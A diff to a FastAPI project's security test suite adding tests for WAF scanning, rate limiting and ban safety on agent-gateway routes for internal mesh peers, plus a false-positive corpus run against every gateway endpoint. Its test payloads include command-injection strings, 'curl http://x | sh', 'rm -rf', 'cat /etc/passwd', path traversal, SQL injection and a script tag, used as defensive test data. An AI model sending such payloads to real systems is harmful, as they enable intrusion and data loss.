@@ -20,13 +20,17 @@ from __future__ import annotations
 
 import asyncio
 import contextlib
+import enum
 import logging
+import uuid
 from http import HTTPStatus
-from typing import TYPE_CHECKING, Annotated, ClassVar
-from unittest.mock import MagicMock
+from types import UnionType
+from typing import TYPE_CHECKING, Annotated, ClassVar, Union, get_args, get_origin
+from unittest.mock import AsyncMock, MagicMock
 
 import pytest
 from fastapi import Depends, FastAPI, WebSocket, WebSocketDisconnect, status
+from fastapi.routing import APIRoute
 from fastapi.testclient import TestClient
 from guard import SecurityMiddleware
 from guard.adapters import StarletteGuardRequest, StarletteGuardResponse
@@ -39,8 +43,21 @@ from guard_core.exceptions import GuardRedisError
 from guard_core.handlers.behavior_handler import BehaviorRule
 from guard_core.handlers.ipban_handler import ip_ban_manager
 from guard_core.utils import extract_client_ip, is_ip_allowed
+from pydantic import BaseModel
 from roboco import security
 from roboco.api.app import create_app
+from roboco.api.deps import get_choreographer, get_content_actions
+from roboco.api.routes.v1 import do as do_module
+from roboco.api.routes.v1 import (
+    flow_auditor,
+    flow_board,
+    flow_cell_pm,
+    flow_dev,
+    flow_doc,
+    flow_main_pm,
+    flow_pr_reviewer,
+    flow_qa,
+)
 from roboco.api.websocket import guard_ws
 from starlette.requests import Request
 from starlette.responses import Response
@@ -227,6 +244,468 @@ class TestNginxForwardedClientIP:
                 headers={"X-Forwarded-For": "192.168.1.50"},
             )
         assert resp.status_code != HTTPStatus.OK
+
+
+_TAILNET_PEER = "100.64.1.2"
+_EXTERNAL_PEER = "203.0.113.55"
+_CMD_INJECTION_BODY = {"branch": '; sh -c "id"'}
+_FREETEXT_ATTACK_BODY = {
+    "text": "<script>alert(1)</script>",
+    "notes": "DROP TABLE tasks;",
+    "message": "rm -rf /tmp/x && curl http://x | sh",
+}
+
+
+def _guarded_gateway_app(*, ip: str, rate_limit: int | None = None) -> _InjectClientIP:
+    """A guarded app mirroring the do.py/flow_*.py split: one @mesh_scanned
+    agent-gateway route, one ordinary (panel-shaped) route, and /health."""
+    cfg = security.build_security_config()
+    cfg.enable_redis = False
+    if rate_limit is not None:
+        cfg.rate_limit = rate_limit
+        cfg.rate_limit_window = 60
+
+    @contextlib.asynccontextmanager
+    async def _life(_app: FastAPI) -> AsyncIterator[None]:
+        yield
+
+    app = FastAPI(lifespan=make_lifespan(existing_lifespan=_life))
+    deco = security.guard_deco
+
+    @app.post("/api/v1/do/gateway_probe")
+    @security.mesh_scanned
+    @deco.rate_limit(requests=rate_limit or 20, window=60)
+    async def _gateway(_body: dict) -> dict[str, bool]:
+        return {"ok": True}
+
+    @app.post("/api/optimal/panel_probe")
+    async def _panel(_body: dict) -> dict[str, bool]:
+        return {"ok": True}
+
+    @app.get("/health")
+    async def _health() -> dict[str, bool]:
+        return {"ok": True}
+
+    app.state.guard_decorator = deco
+    app.add_middleware(SecurityMiddleware, config=cfg)
+    return _InjectClientIP(app, ip)
+
+
+class TestMeshGatewayRouteScanning:
+    """The agent gateway (do.py / flow_*.py) carries a route-level allowlist
+    (`mesh_scanned`, roboco/security.py) so a mesh peer is WAF-scanned and
+    rate-limited THERE instead of riding the global whitelist -- while other
+    routes (panel-shaped, /health, ...) keep the mesh fully exempt, unchanged.
+    """
+
+    def test_mesh_peer_waf_hit_on_gateway_route_is_blocked(self) -> None:
+        with _client(_guarded_gateway_app(ip=_DOCKER_BRIDGE_PEER)) as client:
+            resp = client.post("/api/v1/do/gateway_probe", json=_CMD_INJECTION_BODY)
+        assert resp.status_code != HTTPStatus.OK
+
+    def test_mesh_peer_freetext_fields_not_waf_blocked(self) -> None:
+        """excluded_detection_body_fields shields agent-authored content: a
+        benign verb whose free-text fields look code-shaped must still reach
+        the endpoint on a route that is now actually WAF-scanned."""
+        with _client(_guarded_gateway_app(ip=_DOCKER_BRIDGE_PEER)) as client:
+            resp = client.post("/api/v1/do/gateway_probe", json=_FREETEXT_ATTACK_BODY)
+        assert resp.status_code == HTTPStatus.OK
+
+    def test_mesh_peer_on_non_gateway_route_unaffected(self) -> None:
+        """Same attack payload, same peer, a route without mesh_scanned: the
+        mesh stays on the global whitelist there, WAF never runs."""
+        with _client(_guarded_gateway_app(ip=_DOCKER_BRIDGE_PEER)) as client:
+            resp = client.post("/api/optimal/panel_probe", json=_CMD_INJECTION_BODY)
+        assert resp.status_code == HTTPStatus.OK
+
+    def test_mesh_peer_on_excluded_path_unaffected(self) -> None:
+        with _client(_guarded_gateway_app(ip=_DOCKER_BRIDGE_PEER)) as client:
+            resp = client.get("/health")
+        assert resp.status_code == HTTPStatus.OK
+
+
+class TestMeshBanSafety:
+    """Bans override the whitelist on EVERY route, so one WAF hit on a
+    gateway route must never get the mesh IP itself banned -- that would wedge
+    the whole container fleet on /api/optimal/*, /api/docs/*, and everywhere
+    else `bypass(["ip_ban"])` never reaches. Uses cmd_injection (threshold=1,
+    _THREAT_BAN_CONFIG) deliberately: the single hardest, single-hit case."""
+
+    def test_mesh_waf_hit_blocked_but_never_banned(self) -> None:
+        ip_ban_manager.banned_ips.pop(_DOCKER_BRIDGE_PEER, None)
+        try:
+            with _client(_guarded_gateway_app(ip=_DOCKER_BRIDGE_PEER)) as client:
+                attack = client.post(
+                    "/api/v1/do/gateway_probe", json=_CMD_INJECTION_BODY
+                )
+                assert attack.status_code != HTTPStatus.OK
+
+                benign = client.post("/api/v1/do/gateway_probe", json=_BENIGN_BODY)
+            assert benign.status_code == HTTPStatus.OK
+            assert (
+                asyncio.run(ip_ban_manager.is_ip_banned(_DOCKER_BRIDGE_PEER)) is False
+            )
+        finally:
+            asyncio.run(ip_ban_manager.unban_ip(_DOCKER_BRIDGE_PEER))
+
+    def test_rate_limit_never_fires_on_gateway_route_for_mesh_peer(self) -> None:
+        """mesh_scanned now bypasses `rate_limit` outright (not just `ip_ban`)
+        -- the CEO's ask was WAF scanning, not a new 429 wedge vector. A mesh
+        peer blowing through a per-route threshold of 1 on 3 rapid calls must
+        see all three succeed, and (by construction) never get banned."""
+        peer = "172.19.0.9"
+        ip_ban_manager.banned_ips.pop(peer, None)
+        try:
+            with _client(_guarded_gateway_app(ip=peer, rate_limit=1)) as client:
+                responses = [
+                    client.post("/api/v1/do/gateway_probe", json=_BENIGN_BODY)
+                    for _ in range(3)
+                ]
+            assert all(r.status_code == HTTPStatus.OK for r in responses)
+            assert asyncio.run(ip_ban_manager.is_ip_banned(peer)) is False
+        finally:
+            asyncio.run(ip_ban_manager.unban_ip(peer))
+
+    def test_external_ip_waf_hit_on_panel_route_still_banned(self) -> None:
+        """The mesh-safe wrapper must not weaken banning for a real external
+        attacker: unaffected route, unaffected IP, normal ban."""
+        try:
+            with _client(_guarded_gateway_app(ip=_EXTERNAL_PEER)) as client:
+                resp = client.post("/api/optimal/panel_probe", json=_CMD_INJECTION_BODY)
+            assert resp.status_code != HTTPStatus.OK
+            assert asyncio.run(ip_ban_manager.is_ip_banned(_EXTERNAL_PEER)) is True
+        finally:
+            asyncio.run(ip_ban_manager.unban_ip(_EXTERNAL_PEER))
+
+    def test_cidr_ban_overlapping_mesh_refused(self) -> None:
+        """A CIDR-form ban request that merely OVERLAPS the mesh (not just an
+        exact `_MESH_ROUTE_ALLOWLIST` member) must be refused too -- the old
+        `"/" not in ip` skip let a range like this straight through."""
+        overlapping = "172.20.0.0/16"
+        try:
+            asyncio.run(ip_ban_manager.ban_ip(overlapping, 60))
+            assert asyncio.run(ip_ban_manager.is_ip_banned("172.20.5.5")) is False
+        finally:
+            ip_ban_manager.banned_networks = [
+                (net, exp)
+                for net, exp in ip_ban_manager.banned_networks
+                if str(net) != overlapping
+            ]
+
+    def test_cidr_ban_not_overlapping_mesh_passes_through(self) -> None:
+        """A CIDR range with no overlap with the mesh is unaffected -- the
+        mesh-safety patch only refuses ranges that actually reach the mesh."""
+        clean = "203.0.113.0/24"
+        try:
+            asyncio.run(ip_ban_manager.ban_ip(clean, 60))
+            assert asyncio.run(ip_ban_manager.is_ip_banned("203.0.113.5")) is True
+        finally:
+            ip_ban_manager.banned_networks = [
+                (net, exp)
+                for net, exp in ip_ban_manager.banned_networks
+                if str(net) != clean
+            ]
+
+
+class TestIpOverlapsMeshPredicate:
+    """Direct coverage of `_ip_overlaps_mesh`, the CIDR-safe replacement for
+    the old `"/" not in ip and _in_networks(...)` skip."""
+
+    def test_plain_mesh_address_overlaps(self) -> None:
+        assert security._ip_overlaps_mesh("172.18.0.5") is True
+
+    def test_plain_external_address_does_not_overlap(self) -> None:
+        assert security._ip_overlaps_mesh("203.0.113.7") is False
+
+    def test_cidr_range_overlapping_mesh_detected(self) -> None:
+        assert security._ip_overlaps_mesh("172.20.0.0/16") is True
+
+    def test_cidr_range_not_overlapping_mesh_not_detected(self) -> None:
+        assert security._ip_overlaps_mesh("203.0.113.0/24") is False
+
+    def test_malformed_input_does_not_overlap(self) -> None:
+        assert security._ip_overlaps_mesh("not-an-ip") is False
+
+
+class TestMeshRouteVsOtherAllowlists:
+    """The gateway route allowlist is mesh-only -- narrower than the global
+    whitelist, which also covers the tailnet. A tailnet client is blocked on
+    the gateway (not a mesh member) but stays whitelisted everywhere else."""
+
+    def test_tailnet_client_blocked_on_gateway_route(self) -> None:
+        with _client(_guarded_gateway_app(ip=_TAILNET_PEER)) as client:
+            resp = client.post("/api/v1/do/gateway_probe", json=_BENIGN_BODY)
+        assert resp.status_code == HTTPStatus.FORBIDDEN
+
+    def test_tailnet_client_allowed_on_panel_route(self) -> None:
+        with _client(_guarded_gateway_app(ip=_TAILNET_PEER)) as client:
+            resp = client.post("/api/optimal/panel_probe", json=_CMD_INJECTION_BODY)
+        assert resp.status_code == HTTPStatus.OK
+
+
+class TestMeshRouteForwardedLanClient:
+    """nginx (the docker-bridge peer) forwarding a real LAN client via XFF
+    must not ride the gateway route's mesh-only allowlist either."""
+
+    def test_forwarded_lan_client_blocked_on_gateway_route(self) -> None:
+        with _client(_guarded_gateway_app(ip=_DOCKER_BRIDGE_PEER)) as client:
+            resp = client.post(
+                "/api/v1/do/gateway_probe",
+                json=_BENIGN_BODY,
+                headers={"X-Forwarded-For": "192.168.1.50"},
+            )
+        assert resp.status_code != HTTPStatus.OK
+
+    def test_forwarded_lan_client_blocked_on_panel_route(self) -> None:
+        """Unchanged from test_nginx_forwarded_lan_client_is_not_whitelisted,
+        pinned again on the panel-shaped route in this fixture."""
+        with _client(_guarded_gateway_app(ip=_DOCKER_BRIDGE_PEER)) as client:
+            resp = client.post(
+                "/api/optimal/panel_probe",
+                json=_BENIGN_BODY,
+                headers={"X-Forwarded-For": "192.168.1.50"},
+            )
+        assert resp.status_code != HTTPStatus.OK
+
+
+# --------------------------------------------------------------------------
+# Durable false-positive corpus: every real v1 gateway endpoint, fuzzed.
+# --------------------------------------------------------------------------
+
+_CORPUS_STRING = (
+    "rm -rf /tmp/x && curl http://h | sh\n"
+    "$(id); cat /etc/passwd\n"
+    "DROP TABLE tasks; -- ' OR 1=1 --\n"
+    "<script>alert(1)</script>\n"
+    "../../etc/passwd\n"
+    "-old\n"
+    "+new\n"
+    "os.system(cmd)\n"
+    "https://x.example.com/path?a=1&b=2"
+)
+
+# Reference/controlled-vocabulary fields left at a benign sample instead of
+# the corpus string: agent/cell slugs, external platform ids, and enum-like
+# labels (some field_validator-enforced, some just conventional) that stay
+# individually SCANNED by design -- mirrors the "rejected" list in
+# roboco/security.py's _WAF_FREETEXT_BODY_FIELDS audit. Every one of these
+# is either nested in an excluded container (project_slug, task_ref,
+# tweet_id, action, ... -- protected regardless via items/posts/findings/
+# drafts/process_change) or would otherwise WAF-block its own endpoint for
+# no security reason: fuzzing a team-name field with shell/SQL text tests
+# nothing real for an authenticated internal gateway.
+_IDENTIFIER_FIELDS = frozenset(
+    {
+        "slug",
+        "team",
+        "feature_slug",
+        "assigned_to",
+        "new_assignee",
+        "target_cells",
+        "composition_id",
+        "platforms",
+        "tags",
+        "reviewers",
+        "skill",
+        "recipient",
+        "target",
+        "plan_step",
+        "services",
+        "priority",
+        "event",
+        "orientation",
+        "blocker_type",
+        "nature",
+        "task_type",
+    }
+)
+
+
+def _strip_annotation(annotation: object) -> object:
+    """Peel Optional/Union and Annotated wrappers down to the concrete type."""
+    while True:
+        if hasattr(annotation, "__metadata__"):
+            annotation = get_args(annotation)[0]
+            continue
+        origin = get_origin(annotation)
+        if origin in (UnionType, Union):
+            args = [a for a in get_args(annotation) if a is not type(None)]
+            if len(args) == 1:
+                annotation = args[0]
+                continue
+        break
+    return annotation
+
+
+def _sample_value(annotation: object, field_name: str) -> object:
+    """One JSON-able value for a pydantic field, recursing into nested
+    models/lists so every free-text-shaped leaf gets the corpus string."""
+    annotation = _strip_annotation(annotation)
+    origin = get_origin(annotation)
+    if origin is list:
+        (item_type,) = get_args(annotation) or (str,)
+        return [_sample_value(item_type, field_name)]
+    if origin is dict:
+        return {}
+    if isinstance(annotation, type) and issubclass(annotation, BaseModel):
+        return _build_payload(annotation)
+    return _sample_scalar(annotation, field_name)
+
+
+def _sample_scalar(annotation: object, field_name: str) -> object:
+    """The non-container leg of `_sample_value`, split out to stay under the
+    return-statement budget (int/bool/enum/uuid/str/fallback)."""
+    if isinstance(annotation, type) and issubclass(annotation, enum.Enum):
+        return next(iter(annotation)).value
+    if annotation is uuid.UUID:
+        return str(uuid.uuid4())
+    if annotation is bool:
+        return False
+    if annotation in (int, float):
+        return 1
+    if annotation is str:
+        return "safe-value" if field_name in _IDENTIFIER_FIELDS else _CORPUS_STRING
+    return _CORPUS_STRING
+
+
+def _build_payload(model: type[BaseModel]) -> dict[str, object]:
+    return {
+        name: _sample_value(f.annotation, name)
+        for name, f in model.model_fields.items()
+    }
+
+
+_FLOW_PREFIX_ROLE = {
+    "auditor": "auditor",
+    "board": "product_owner",
+    "cell_pm": "cell_pm",
+    "developer": "developer",
+    "documenter": "documenter",
+    "main_pm": "main_pm",
+    "pr_reviewer": "pr_reviewer",
+    "qa": "qa",
+}
+
+
+def _role_for_path(path: str) -> str:
+    if path.startswith("/api/v1/flow/"):
+        return _FLOW_PREFIX_ROLE[path.split("/")[4]]
+    return "developer"  # do.py is token-only; any role passes its auth guard
+
+
+def _corpus_envelope() -> MagicMock:
+    env = MagicMock()
+    env.as_dict.return_value = {"status": "ok", "task_id": None, "next": "continue"}
+    return env
+
+
+class _AnyVerbService:
+    """Stands in for ContentActions/Choreographer: every verb call resolves
+    to a canned OK envelope. The corpus test only cares whether the WAF
+    blocks the request before any of this runs."""
+
+    def __getattr__(self, _name: str) -> AsyncMock:
+        return AsyncMock(return_value=_corpus_envelope())
+
+
+_GATEWAY_ROUTER_MODULES = (
+    do_module,
+    flow_auditor,
+    flow_board,
+    flow_cell_pm,
+    flow_dev,
+    flow_doc,
+    flow_main_pm,
+    flow_pr_reviewer,
+    flow_qa,
+)
+
+_GUARD_BLOCK_STATUS_CODES = {
+    HTTPStatus.BAD_REQUEST,
+    HTTPStatus.FORBIDDEN,
+    HTTPStatus.TOO_MANY_REQUESTS,
+}
+
+# The real gateway surface as of this writing (102) -- a floor, not an exact
+# pin, so the test doesn't need editing every time a verb is added.
+_MIN_GATEWAY_ENDPOINTS = 100
+
+
+def _iter_api_routes(app: FastAPI) -> list[APIRoute]:
+    """Flatten ``app.routes`` into ``APIRoute`` objects.
+
+    FastAPI >=0.140 wraps an included router in an internal
+    ``_IncludedRouter`` instead of copying its routes straight into
+    ``app.routes``; that wrapper exposes the original ``APIRouter`` as
+    ``.original_router``. Following it down keeps this walk correct on
+    both that shape and the older direct-copy one.
+    """
+    routes: list[APIRoute] = []
+    for route in app.routes:
+        if isinstance(route, APIRoute):
+            routes.append(route)
+        elif hasattr(route, "original_router"):
+            routes.extend(
+                r for r in route.original_router.routes if isinstance(r, APIRoute)
+            )
+    return routes
+
+
+def _corpus_gateway_app() -> FastAPI:
+    """Every real v1 gateway router, guarded exactly like production
+    (mesh_scanned on every route), DB-free: ContentActions/Choreographer are
+    replaced with a stub that resolves every verb to a canned OK envelope."""
+    cfg = security.build_security_config()
+    cfg.enable_redis = False
+
+    @contextlib.asynccontextmanager
+    async def _life(_app: FastAPI) -> AsyncIterator[None]:
+        yield
+
+    app = FastAPI(lifespan=make_lifespan(existing_lifespan=_life))
+    for module in _GATEWAY_ROUTER_MODULES:
+        app.include_router(module.router)
+    app.dependency_overrides[get_content_actions] = _AnyVerbService
+    app.dependency_overrides[get_choreographer] = _AnyVerbService
+    app.state.guard_decorator = security.guard_deco
+    app.add_middleware(SecurityMiddleware, config=cfg)
+    return app
+
+
+class TestGatewayCorpusNoFalsePositive:
+    """Regression corpus: every /api/v1 gateway endpoint's pydantic body,
+    fully populated with a kitchen-sink shell/SQL/HTML/path-traversal/diff/
+    code/URL corpus string in every free-text-shaped field, must pass the
+    real WAF for a mesh peer. Endpoints are enumerated from ``app.routes``
+    and their request model from ``route.body_field`` (the same resolution
+    FastAPI itself uses), so a future endpoint is covered automatically."""
+
+    def test_no_endpoint_waf_blocks_the_corpus(self) -> None:
+        app = _corpus_gateway_app()
+        endpoints = [
+            route
+            for route in _iter_api_routes(app)
+            if route.path.startswith("/api/v1/") and route.body_field is not None
+        ]
+        # Sanity: the full gateway surface, not a stub that silently shrank.
+        assert len(endpoints) >= _MIN_GATEWAY_ENDPOINTS
+
+        with _client(_InjectClientIP(app, _DOCKER_BRIDGE_PEER)) as client:
+            for route in endpoints:
+                body_field = route.body_field
+                assert body_field is not None
+                model = body_field.field_info.annotation
+                assert model is not None and issubclass(model, BaseModel)
+                body = _build_payload(model)
+                headers = {
+                    "X-Agent-ID": str(uuid.uuid4()),
+                    "X-Agent-Role": _role_for_path(route.path),
+                }
+                resp = client.post(route.path, json=body, headers=headers)
+                assert resp.status_code not in _GUARD_BLOCK_STATUS_CODES, (
+                    f"{route.path} blocked by guard: "
+                    f"{resp.status_code} {resp.text[:200]}"
+                )
 
 
 class TestDecoyPaths:
